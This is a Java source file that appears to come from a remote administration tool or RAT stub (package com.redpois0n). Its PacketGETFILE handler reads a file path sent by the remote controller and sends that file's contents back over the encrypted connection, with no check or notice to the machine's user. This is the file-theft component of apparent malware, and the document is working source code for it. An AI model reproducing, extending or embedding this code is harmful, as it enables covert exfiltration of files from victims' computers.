package com.redpois0n.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.common.io.FileIO;
import com.redpois0n.stub.packets.outgoing.Header;


public class PacketGETFILE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());	
		
		if (file.exists() && file.isFile()) {		
			Connection.addToSendQueue(new PacketBuilder(Header.SEND_FILE, new String[] { file.getName(), file.getAbsolutePath() }));
			
			Connection.lock();
			FileIO.writeFile(file, Connection.dos, null, Main.getKey());
			Connection.lock();
		}	
	}

}
